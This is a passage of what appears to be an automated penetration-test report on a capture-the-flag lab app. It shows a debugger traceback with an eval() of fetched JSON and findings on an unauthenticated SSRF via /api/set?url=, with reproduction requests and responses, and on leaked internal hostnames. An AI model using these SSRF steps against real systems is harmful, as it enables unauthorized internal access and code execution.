+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;eval_result = eval(json.loads(script)[&amp;#34;script&amp;#34;])  # Be cautious with eval due to security risks&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;name = requests.get(&amp;#39;http://nginx/name/get&amp;#39;).text&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;#eval_result = api_script&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272436112&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/api.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;73&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;get&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:param \*\*kwargs: Optional arguments that ``request`` takes.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:return: :class:`Response &amp;lt;Response&amp;gt;` object&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;:rtype: requests.Response&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;return request(&amp;#34;get&amp;#34;, url, params=params, **kwargs)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def options(url, **kwargs):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;r&amp;#34;&amp;#34;&amp;#34;Sends an OPTIONS request.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272510128&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/api.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;59&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# By using the &amp;#39;with&amp;#39; statement we are sure the session is closed, thus we&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# avoid leaving sockets open which can trigger a ResourceWarning in some&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;# cases, and look like a memory leak in others.&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;with sessions.Session() as session:&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;return session.request(method=method, url=url, **kwargs)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt;def get(url, params=None, **kwargs):&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;r&amp;#34;&amp;#34;&amp;#34;Sends a GET request.&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272510352&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/sessions.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;575&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;params=params or {},&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;auth=auth,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;cookies=cookies,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;hooks=hooks,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;)&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;prep = self.prepare_request(req)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;proxies = proxies or {}&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;settings = self.merge_environment_settings(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;prep.url, proxies, stream, verify, cert&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272510464&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/sessions.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;484&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare_request&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;auth = request.auth&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;if self.trust_env and not auth and not self.auth:&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;auth = get_netrc_auth(request.url)&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;p = PreparedRequest()&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;p.prepare(&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;method=request.method.upper(),&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;url=request.url,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;files=request.files,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;data=request.data,&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;json=request.json,&lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272510576&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/models.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;367&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;json=None,&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;    &lt;/span&gt;):&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;&amp;#34;&amp;#34;&amp;#34;Prepares the entire request with the given parameters.&amp;#34;&amp;#34;&amp;#34;&lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;
+&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_method(method)&lt;/pre&gt;
+&lt;pre class=&quot;line current&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_url(url, params)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_headers(headers)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_cookies(cookies)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_body(data, files, json)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;        &lt;/span&gt;self.prepare_auth(auth, url)&lt;/pre&gt;
+&lt;pre class=&quot;line after&quot;&gt;&lt;span class=&quot;ws&quot;&gt;&lt;/span&gt; &lt;/pre&gt;&lt;/div&gt;
+&lt;/div&gt;
+
+&lt;li&gt;&lt;div class=&quot;frame&quot; id=&quot;frame-131562272510688&quot;&gt;
+  &lt;h4&gt;File &lt;cite class=&quot;filename&quot;&gt;&quot;/usr/local/lib/python3.8/site-packages/requests/models.py&quot;&lt;/cite&gt;,
+      line &lt;em class=&quot;line&quot;&gt;438&lt;/em&gt;,
+      in &lt;code class=&quot;function&quot;&gt;prepare_url&lt;/code&gt;&lt;/h4&gt;
+  &lt;div class=&quot;source library&quot;&gt;&lt;pre class=&quot;line before&quot;&gt;&lt;span class=&quot;ws&quot;&gt;            &lt;/span&gt;scheme, auth, host, port, path,</pre></div>
+</div>
+<div class="f" id="finding-3">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 3. [ssrf] Unauthenticated SSRF via /api/set — Server fetches arbitrary internal URLs</h3>
+<div class="kv">Screen: <code>s-0016</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32866/</div>
+<div class="desc">The `/api/set?url=&lt;value&gt;` endpoint accepts an arbitrary URL without any authentication or input validation. The stored URL is then fetched server-side by the `/app` page to retrieve the name/script value. An unauthenticated attacker can redirect the server to fetch from any internal host, enabling internal network scanning and chaining to RCE (if the attacker controls a host that returns `{&quot;script&quot;: &quot;malicious_code&quot;}`). Demonstrated by redirecting the fetch to the internal Flask microservice at port 32867, causing the app to execute a different script ('OK ' * 4) from that internal service.</div>
+<div><b>Reproduction</b></div><pre>1. GET /api/set?url=http://target.local:32867/script → returns &quot;API URL set to: http://target.local:32867/script&quot; (200)
+2. GET /app → page now shows &quot;OK OK OK OK &quot; — content fetched and executed from the internal port 32867 service
+3. Repeat with /api/set?url=http://target.local:32867/healthcheck to confirm arbitrary internal-host access
+No authentication is required at any step.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4azd7-bg</code> — <code>artifacts/s-0016/ev-mqz4azd7-bg/</code></div><div class="lbl">REQUEST</div><pre>GET /api/set HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 400
+connection: keep-alive
+content-length: 15
+content-type: text/plain
+date: Mon, 29 Jun 2026 11:11:37 GMT
+server: nginx/1.31.2
+
+Invalid request</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4b06t-bh</code> — <code>artifacts/s-0016/ev-mqz4b06t-bh/</code></div><div class="lbl">REQUEST</div><pre>GET /api/set?url=http://target.local:32867/script HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 50
+content-type: text/plain
+date: Mon, 29 Jun 2026 11:11:38 GMT
+server: nginx/1.31.2
+
+API URL set to: http://target.local:32867/script</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4b3fx-bi</code> — <code>artifacts/s-0016/ev-mqz4b3fx-bi/</code></div><div class="lbl">REQUEST</div><pre>GET /api/set?url=http://target.local:32867/healthcheck HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+connection: keep-alive
+content-length: 55
+content-type: text/plain
+date: Mon, 29 Jun 2026 11:11:43 GMT
+server: nginx/1.31.2
+
+API URL set to: http://target.local:32867/healthcheck</pre></div>
+</div>
+<div class="f" id="finding-4">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 4. [info-disclosure] Dashboard exposes internal service topology and target file path</h3>
+<div class="kv">Screen: <code>s-0001</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32866/</div>
+<div class="desc">The application's root dashboard page (unauthenticated) discloses the full internal Docker service topology: internal hostnames (nginx:80, flask_app:8080, flask_api:8081), explicit internal URL mappings, and the challenge objective that names the sensitive file /FLAG.txt on the flask_app container. This gives an attacker a complete map of the microservice architecture without any authentication. Additionally, nginx version 1.31.2 is leaked in all 404 error pages.</div>
+<div><b>Reproduction</b></div><pre>1. Send GET / with no authentication or session cookie.
+2. The HTML response (status 200) contains a Hosts table listing internal Docker hostnames and URL mappings: Nginx Root http://nginx:80/, Flask App http://flask_app:8080 → http://nginx:80/app/, Flask API http://flask_api:8081 → http://nginx:8081/.
+3. The page text explicitly states: &quot;The goal of this challenge is to get command execution on the flask_app container, and grab the file /FLAG.txt&quot;.
+4. Any 404 page leaks: nginx/1.31.2.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1okvw-35</code> — <code>artifacts/s-0001/ev-mqz1okvw-35/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-path-control HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+connection: keep-alive
+content-length: 153
+content-type: text/html
+date: Mon, 29 Jun 2026 09:58:13 GMT
+server: nginx/1.31.2
+
+&lt;html&gt;
+&lt;head&gt;&lt;title&gt;404 Not Found&lt;/title&gt;&lt;/head&gt;
+&lt;body&gt;
+&lt;center&gt;&lt;h1&gt;404 Not Found&lt;/h1&gt;&lt;/center&gt;
+&lt;hr&gt;&lt;center&gt;nginx/1.31.2&lt;/center&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1oke4-34</code> — <code>artifacts/s-0001/ev-mqz1oke4-34/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: keep-alive
+content-length: 3411
+content-type: text/html
+date: Mon, 29 Jun 2026 09:58:12 GMT
+etag: &quot;6a3fee74-d53&quot;
+last-modified: Sat, 27 Jun 2026 15:38:28 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;API Dashboard&lt;/title&gt;
+    &lt;style&gt;
+        body, html {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #0056b3;
+            border-bottom: 2px solid #0056b3;
+            padding-bottom: 10px;
+        }
+
+        section {
+            margin-top: 20px;
+            padding: 20px;
+            background: #ffffff;
+            border: 1px solid #dddddd;
+        }
+
+        a {
+            background-color: #007bff;
+            color: white;
+            padding: 8px 16px;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        a:hover {
+            background-color: #0056b3;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 8px;
+            border-bottom: 1px solid #dddddd;
+        }
+
+        th {
+            background-color: #f4f4f4;
+        }
+
+        td {
+            background-color: #fafafa;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;API Dashboard&lt;/h1&gt;
+        &lt;p&gt;The goal of this challenge is to get command execution on the flask_app container, and grab the file /FLAG.txt&lt;/p&gt;
+        &lt;section&gt;
+            &lt;h2&gt;API URL&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;apiResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/api/set?url=http://flask_api:8081/script&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Name Management&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;nameResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/name/set?name=Cocomelon&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Hosts&lt;/h2&gt;
+            &lt;table&gt;
+                &lt;thead&gt;
+                    &lt;tr&gt;
+                        &lt;th&gt;Name&lt;/th&gt;
+                        &lt;th&gt;URL&lt;/th&gt;
+                        &lt;th&gt;Mapping&lt;/th&gt;
+                    &lt;/tr&gt;
+                &lt;/thead&gt;
+                &lt;tbody&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Nginx Root&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask App&lt;/td&gt;
+                        &lt;td&gt;http://flask_app:8080&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/app/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask API&lt;/td&gt;
+                        &lt;td&gt;http://flask_api:8081&lt;/td&gt;
+                        &lt;td&gt;http://nginx:8081/&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/tbody&gt;
+            &lt;/table&gt;
+        &lt;/section&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        fetchApiData();
+        fetchName();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz1hp6f-2j</code> — <code>artifacts/s-0001/ev-mqz1hp6f-2j/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+accept: text/html</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: keep-alive
+content-length: 3411
+content-type: text/html
+date: Mon, 29 Jun 2026 09:52:52 GMT
+etag: &quot;6a3fee74-d53&quot;
+last-modified: Sat, 27 Jun 2026 15:38:28 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;API Dashboard&lt;/title&gt;
+    &lt;style&gt;
+        body, html {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #0056b3;
+            border-bottom: 2px solid #0056b3;
+            padding-bottom: 10px;
+        }
+
+        section {
+            margin-top: 20px;
+            padding: 20px;
+            background: #ffffff;
+            border: 1px solid #dddddd;
+        }
+
+        a {
+            background-color: #007bff;
+            color: white;
+            padding: 8px 16px;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        a:hover {
+            background-color: #0056b3;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 8px;
+            border-bottom: 1px solid #dddddd;
+        }
+
+        th {
+            background-color: #f4f4f4;
+        }
+
+        td {
+            background-color: #fafafa;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;h1&gt;API Dashboard&lt;/h1&gt;
+        &lt;p&gt;The goal of this challenge is to get command execution on the flask_app container, and grab the file /FLAG.txt&lt;/p&gt;
+        &lt;section&gt;
+            &lt;h2&gt;API URL&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;apiResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/api/set?url=http://flask_api:8081/script&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Name Management&lt;/h2&gt;
+            &lt;div&gt;
+                &lt;p id=&quot;nameResult&quot;&gt;&lt;/p&gt;
+                &lt;p&gt;&lt;a href=&quot;/name/set?name=Cocomelon&quot; target=&quot;_blank&quot;&gt;reset&lt;/a&gt;&lt;/p&gt;
+            &lt;/div&gt;
+        &lt;/section&gt;
+        &lt;section&gt;
+            &lt;h2&gt;Hosts&lt;/h2&gt;
+            &lt;table&gt;
+                &lt;thead&gt;
+                    &lt;tr&gt;
+                        &lt;th&gt;Name&lt;/th&gt;
+                        &lt;th&gt;URL&lt;/th&gt;
+                        &lt;th&gt;Mapping&lt;/th&gt;
+                    &lt;/tr&gt;
+                &lt;/thead&gt;
+                &lt;tbody&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Nginx Root&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask App&lt;/td&gt;
+                        &lt;td&gt;http://flask_app:8080&lt;/td&gt;
+                        &lt;td&gt;http://nginx:80/app/&lt;/td&gt;
+                    &lt;/tr&gt;
+                    &lt;tr&gt;
+                        &lt;td&gt;Flask API&lt;/td&gt;
+                        &lt;td&gt;http://flask_api:8081&lt;/td&gt;
+                        &lt;td&gt;http://nginx:8081/&lt;/td&gt;
+                    &lt;/tr&gt;
+                &lt;/tbody&gt;
+            &lt;/table&gt;
+        &lt;/section&gt;
+    &lt;/div&gt;
+    &lt;script src=&quot;script.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        fetchApiData();
+        fetchName();
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-5">
+<h3><span class="badge" style="background:#c9a227">LOW</span> 5. [info-disclosure] Internal service topology exposed in HTML comments on /app</h3>
+<div class="kv">Screen: <code>s-0018</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32866/</div>
+<div class="desc">The /app page embeds internal nginx service hostnames and API route templates in HTML comments visible to any unauthenticated visitor: `&lt;!-- http://nginx/api/get http://nginx/api/set?url=value --&gt;` and `&lt;!-- http://nginx/name/get http://nginx/name/set?name=value --&gt;`. These reveal the internal container name (`nginx`), and the exact API shapes (including the SSRF-triggering `url=` and RCE-triggering `name=` parameters), reducing attacker effort to exploit the critical vulnerabilities on the same page.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32866/app (no auth required).
+2. View page source — two HTML comments expose internal nginx hostnames and full API paths: http://nginx/api/get, http://nginx/api/set?url=value, http://nginx/name/get, http://nginx/name/set?name=value.
+3. Compare with GET / (negative control) which has no such comment disclosure.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqz4l4j3-c6</code> — <code>artifacts/s-0018/ev-mqz4l4j3-c6/</code></div><div class="lbl">REQUEST</div><pre>GET / HTTP/1.1
+Host: target.local:32866
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;
+authorization: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+accept-ranges: bytes
+connection: keep-alive
+content-length: 3411
+content-type: text/html
+date: Mon, 29 Jun 2026 11:19:30 GMT
+etag: &quot;6a3fee74-d53&quot;
+last-modified: Sat, 27 Jun 2026 15:38:28 GMT
+server: nginx/1.31.2
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;API Dashboard&lt;/title&gt;
+    &lt;style&gt;
+        body, html {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f9;
+            color: #333;
+            line-height: 1.6;
+        }
+
+        .container {
+            width: 80%;
+            max-width: 1200px;
+            margin: 20px auto;
+            padding: 20px;
+            background-color: #fff;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+
+        h1 {
+            color: #0056b3;
+            border-bottom: 2px solid #0056b3;
+            padding-bottom: 10px;
+        }
+
+        section {
+            margin-top: 20px;
+            padding: 20px;
+            background: #ffffff;
+            border: 1px solid #dddddd;
+        }
+
+        a {
+            background-color: #007bff;
+            color: white;
+            padding: 8px 16px;
+            text-decoration: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        a:hover {
+            background-color: #0056b3;
+        }
+
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 20px;
+        }
+
+        th, td {
+            text-align: left;
+            padding: 8px;
